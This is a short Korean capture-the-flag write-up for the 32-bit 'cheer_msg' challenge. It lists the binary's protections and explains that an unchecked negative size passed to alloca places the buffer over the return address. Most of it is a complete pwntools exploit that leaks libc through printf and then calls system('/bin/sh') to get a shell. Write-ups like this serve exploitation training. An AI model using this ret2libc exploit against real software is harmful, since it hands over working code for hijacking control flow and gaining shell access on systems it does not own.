cheer-msg-100 (exploit)
=============

### 1. Introduction

| RELRO         | STACK CANARY | NX         | PIE    | RPATH    | RUNPATH    | FILE      |
|---------------|--------------|------------|--------|----------|------------|-----------|
| Partial RELRO | Canary found | NX enabled | No PIE | No RPATH | No RUNPATH | cheer_msg |

32비트 바이너리이며 실행흐름은 "메세지 길이 입력 -> 메세지 입력 -> 이름 입력 -> 이름과 메세지 출력" 이다.


### 2. Vulnerability

```c
printf("Hello, I'm Nao.\nGive me your cheering messages :)\n\nMessage Length >> ");
v3 = getint();
n = v3;
v4 = alloca(16 * ((v3 + 30) / 0x10u));
v8 = 16 * ((unsigned int)&v6 >> 4);
return message(16 * ((unsigned int)&v6 >> 4), v3);
```

alloca에서 size를 입력받을 때 입력값에 제한을 두는 구문이 없으므로 음수를 넣을 수 있다.

```
add     eax, edx
mov     ecx, 10h
mov     edx, 0
div     ecx
imul    eax, 10h
sub     esp, eax
```

alloca부분을 어셈으로 보면 입력값에 연산을 거치고 esp에서 빼주는것을 확인할 수 있다. 즉 입력을 음수로 맞추면 할당을 ret 위에 받아서 ret을 덮어쓸 수 있다.


### 3. Exploit
```python
from pwn import *

s = process('./cheer_msg')
l = ELF('/lib/i386-linux-gnu/libc.so.6')
e = ELF('./cheer_msg')

st = ' >> '

main = 0x080485ca

s.sendlineafter(st,str(-154)) # -154
s.recvuntil(st)
s.sendlineafter(st,p32(e.plt['printf']) + p32(0x080487af) + p32(0x0804A00C) + p32(main))
s.recvuntil('Message : \n')
libc_base = u32(s.recv(4)) -0x65ff0
system = libc_base + l.symbols['system']
binsh = libc_base + 0x15b9ab

log.info("LIBC_BASE : " + hex(libc_base))

s.sendlineafter(st,str(-154)) # -154
s.recvuntil(st)
s.sendlineafter(st,p32(system) + "AAAA" + p32(binsh))
s.recvuntil('Message : \n')

s.interactive()
```
